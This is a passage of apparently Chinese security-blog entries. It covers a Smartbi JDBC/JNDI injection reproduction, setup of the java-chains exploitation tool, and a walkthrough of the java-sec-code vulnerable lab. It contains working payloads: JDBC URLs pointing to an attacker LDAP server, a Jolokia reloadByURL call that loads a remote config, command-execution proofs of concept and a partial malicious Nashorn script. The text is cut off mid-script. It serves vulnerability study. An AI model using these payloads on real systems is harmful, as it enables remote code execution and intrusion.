class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://192.168.1.25:15089/547b87&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>ldap:&#x2F;&#x2F;192.168.1.25:15089&#x2F;b69569</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703187.png" alt="20250806193947601"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703694.png" alt="20250806194037543"></p><p>收到DNSLOG记录，说明漏洞存在</p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>Smartbi 身份认证绕过漏洞</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p><p>信息搜集相关：</p><p><a href="https://ckcah.github.io/2020/05/01/googlehack/">https://ckcah.github.io/2020/05/01/googlehack/</a></p><p><a href="https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/">https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/</a></p><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p><p>JDBC反序列化学习</p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p><h1 id="javachains使用"><a href="#javachains使用" class="headerlink" title="javachains使用"></a><strong>javachains使用</strong></h1><p><a href="https://java-chains.vulhub.org/zh/">https://java-chains.vulhub.org/zh/</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># docker 搭建</span><br><span class="hljs-attribute">docker</span> pull javachains/javachains:latest<br><br>docker run -d<span class="hljs-regexp"> ^</span><br>  --name java-chains<span class="hljs-regexp"> ^</span><br>  --restart=always<span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">8011</span>:<span class="hljs-number">8011</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">58080</span>:<span class="hljs-number">58080</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">15089</span>:<span class="hljs-number">50389</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">3308</span>:<span class="hljs-number">3308</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">13999</span>:<span class="hljs-number">13999</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">50000</span>:<span class="hljs-number">50000</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">11527</span>:<span class="hljs-number">11527</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_AUTH=<span class="hljs-literal">true</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_PASS=<span class="hljs-regexp"> ^</span><br>  javachains/javachains:latest<br><br><span class="hljs-comment">#查看当前正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment">#查找日志中包含关键词 password 的行</span><br>docker logs java-chains | findstr password<br>&gt;<span class="hljs-number">08</span>-<span class="hljs-number">02</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span>.<span class="hljs-number">144</span> INFO  [main] c.a.c.w.c.SecurityConfig       |  | password: HDVhxC2MfhKJwcAN<br><br><span class="hljs-comment">#停止</span><br>docker stop java-chains<br><br><span class="hljs-comment">#删除</span><br>docker rm java-chains<br><br></code></pre></td></tr></table></figure><blockquote><p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。如果改端口可能有一些问题，还是尽量在Linux搭可以避免端口问题。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703682.png" alt="20250806200152925"></p></blockquote><p>访问 <code>localhost:8011</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703554.png" alt="20250806200418498"></p><p>密码：<code>docker logs java-chains | findstr password</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071704470.png" alt="20250806200413737"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-sec-code 靶场题解</title>
    <link href="/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/"/>
    <url>/2025/07/28/java-sec-code-master%20%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="java-sec-code-靶场"><a href="#java-sec-code-靶场" class="headerlink" title="java-sec-code 靶场"></a>java-sec-code 靶场</h1><h1 id="一、靶场环境"><a href="#一、靶场环境" class="headerlink" title="一、靶场环境"></a>一、靶场环境</h1><p>源码地址：</p><p><a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p><p>搭建环境：</p><p>IDEA，pache-maven-3.9.1，apache-tomcat-9.0.105，JDK 1.8，MySQL 5.7.26，</p><p>​数据库：小皮面板自带的MySQL，导入sql文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924734.png" alt="20250722121837762"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924866.png" alt="20250722121922614"></p><p>​修改数据库密码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924471.png" alt="20250722121952382"></p><p>​默认端口为8080，如果被占用，在 application.properties 中写入 <code>server.port=8081</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925668.png" alt="20250722122032495"></p><p>之后启动 Maven install</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925205.png" alt="20250722122150263"></p><p>运行 Application.java</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926472.png" alt="20250722122307068"></p><p>访问 127.0.0.1:8081</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926105.png" alt="20250722122339704"></p><p>搭建成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926235.png" alt="20250722122412538"></p><p>以下是一些小的改动：</p><p>参考文章：<a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><blockquote><p>因为项目作者选择的工作环境为linux操作系统，而我本人选择的工作环境为windows操作系统，所以为了部分功能运行成功需要修改几处源码，首先修改CommandInject.java文件下的源码，将sh执行命令替换为cmd命令，还有修改源码中一些其它的linux操作系统上独有的命令。</p></blockquote><ol><li>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926915.png" alt="20250722122752916"></p><ol start="2"><li>src&#x2F;main&#x2F;resources&#x2F;templates&#x2F;index.html</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/codeinject?filepath=/tmp;cat /etc/passwd&#125;&quot;&gt;CmdInject&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/codeinject?filepath=.%26ipconfig&#125;&quot;</span>&gt;</span>CmdInject<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>   <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/path_traversal/vul?filepath=../../../../../etc/passwd&#125;&quot;&gt;PathTraversal&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/path_traversal/vul?filepath=D:/test.txt&#125;&quot;</span>&gt;</span>PathTraversal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <br><span class="hljs-comment">&lt;!--    &lt;a th:href=&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///etc/passwd&#125;&quot;&gt;SSRF&lt;/a&gt;&amp;nbsp;&amp;nbsp;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/ssrf/urlConnection/vuln?url=file:///D:/test.txt&#125;&quot;</span>&gt;</span>SSRF<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926719.png" alt="20250722123350854"></p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><ul><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Actuators-to-RCE">Actuators to RCE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CORS">CORS</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/CSRF">CSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Deserialize">Deserialize</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Fastjson">Fastjson</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI">Java RMI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JSONP">JSONP</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/Poi-ooxml-XXE">POI-OOXML XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SQL-Inject">SQLI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSRF">SSRF</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/SSTI">SSTI</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass">URL whitelist Bypass</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE">XXE</a></li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/JWT">JWT</a>  </li><li><a href="https://github.com/JoyChou93/java-sec-code/wiki/others">Others</a></li></ul><h3 id="Logback-xml"><a href="#Logback-xml" class="headerlink" title="Logback.xml"></a>Logback.xml</h3><p>src&#x2F;main&#x2F;resources&#x2F;logback-online.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>  <span class="hljs-comment">&lt;!-- logback 配置文件标签 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!-- 控制台输出标签 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">withJansi</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">withJansi</span>&gt;</span>  <span class="hljs-comment">&lt;!-- Jansi 是一个 Java 库，用来支持彩色日志输出  --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 输出格式标签 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>[%thread] %highlight(%-5level) %cyan(%logger&#123;15&#125;) - %msg %n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 输出格式 --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 根标签 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- 引用控制台输出标签 --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jmxConfigurator</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 暴露 Logback 的运行时配置能力（开启 JMX 管理功能）  --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>漏洞产生原因：</strong></p><p><code>   &lt;jmxConfigurator/&gt;</code></p><p>作用：暴露 Logback 的运行时配置能力（开启 JMX 管理功能）</p><p>这个配置会注册一个 JMX MBean （可以远程管理的 Java 对象 ，“遥控器”），它允许用户通过 JMX 控制台、Jolokia （Jolokia 是一个用来访问远程 JMX MBeans 的方法，Jolokia 通过 HTTP 访问 JMX）等远程管理工具调用 Logback 的方法</p><p>如果系统部署中 暴露了 Jolokia 的 &#x2F;jolokia 接口，攻击者可以远程调用 Logback 的 reloadByURL 方法，加载恶意配置文件，进而发起 JNDI 注入 ➜ 远程代码执行（RCE）</p><p><strong>漏洞利用：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8081</span><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp">/127.0.0.1:8888!/</span>xxx.xml<br></code></pre></td></tr></table></figure><ul><li><p><code>/jolokia/exec/</code>：Jolokia 的 exec 调用路径</p></li><li><p><code>ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator</code>：Logback 中添加 <code>&lt;jmxConfigurator/&gt;</code> 注册 JMX MBean 后的默认名称</p></li><li><p><code>/reloadByURL/</code>：调用的 JMX 方法，即 <code>reloadByURL(URL configFile)</code>，运行后重新加载 Logback 配置文件</p></li><li><p><code>http:!/!/127.0.0.1:8888!/xxx.xml</code>：注意 <code>!/!/</code> 是 URL 编码中对 <code>/</code> 和 <code>:</code> 的绕过手法，最后解析成：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:8888/xxx.xml</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="Rce-java"><a href="#Rce-java" class="headerlink" title="Rce.java"></a>Rce.java</h3><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Rce.java</p><h4 id="1-runtime-exec"><a href="#1-runtime-exec" class="headerlink" title="1.&#x2F;runtime&#x2F;exec"></a>1.&#x2F;runtime&#x2F;exec</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/runtime/exec&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">CommandExec</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//接收 cmd 参数</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//获取当前 JVM 的 RunTime 对象，通过它可以调用 exec 命令</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<span class="hljs-comment">//接收输出结果</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> run.exec(cmd);<span class="hljs-comment">//执行 cmd 命令</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br>            <span class="hljs-keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(tmpStr);<br>            &#125;<br></code></pre></td></tr></table></figure><p>没有进行过滤，产生了rce 漏洞</p><p><strong>漏洞利用：</strong></p><p>POC：&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;calc.exe</p><p>可以弹出计算机</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927152.png" alt="20250722141657147"></p><p>POC：&#x2F;rce&#x2F;runtime&#x2F;exec?cmd&#x3D;whoami</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927609.png" alt="20250722141728262"></p><h4 id="2-ProcessBuilder"><a href="#2-ProcessBuilder" class="headerlink" title="2.&#x2F;ProcessBuilder"></a>2.&#x2F;ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processBuilder</span><span class="hljs-params">(String cmd)</span> &#123;<span class="hljs-comment">//接收输入的 cmd</span><br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] arrCmd = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<span class="hljs-comment">//将 cmd 直接拼接到 shell 环境</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(arrCmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> processBuilder.start();<span class="hljs-comment">//触发命令执行</span><br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br></code></pre></td></tr></table></figure><p>这一漏洞需要在Linux环境中复现</p><h4 id="3-jscmd"><a href="#3-jscmd" class="headerlink" title="3.&#x2F;jscmd"></a>3.&#x2F;jscmd</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/jscmd&quot;)</span>  <span class="hljs-comment">// 定义GET请求端点</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jsEngine</span><span class="hljs-params">(String jsurl)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <span class="hljs-comment">// 接收jsurl参数</span><br>    <span class="hljs-comment">// 获取JavaScript引擎（Nashorn）</span><br>    <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);    <br>    <span class="hljs-comment">// 获取当前引擎的作用域绑定</span><br>    <span class="hljs-type">Bindings</span> <span class="hljs-variable">bindings</span> <span class="hljs-operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);    <br>    <span class="hljs-comment">// 构造加载远程JS的命令</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);    <br>    <span class="hljs-comment">// 执行加载命令</span><br>    engine.eval(cmd, bindings);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>直接使用用户输入的<code>jsurl</code>构造<code>load()</code>命令</li><li><strong>无任何安全过滤</strong></li></ul><p><strong>漏洞利用：</strong></p><p>因为是基于Java的Nashorn JavaScript引擎，接受一个<strong>外部JS文件URL</strong>（<code>jsurl</code>），然后通过<code>load()</code>函数去加载执行远程的JS代码，如果远程JS包含恶意代码（比如调用Java的<code>Runtime.exec</code>执行系统命令），就会造成远程命令执行（RCE）漏洞。</p><p>先编写一个恶意的JS文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// zz.js</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-title function_">mainOutput</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mainOutput</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// Windows打开计算器命令</span><br>    <span class="hljs-keyword">var</span> cmd = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br>    <span class="hljs-comment">// 执行系统命令</span><br>    <span class="hljs-keyword">var</span> <span 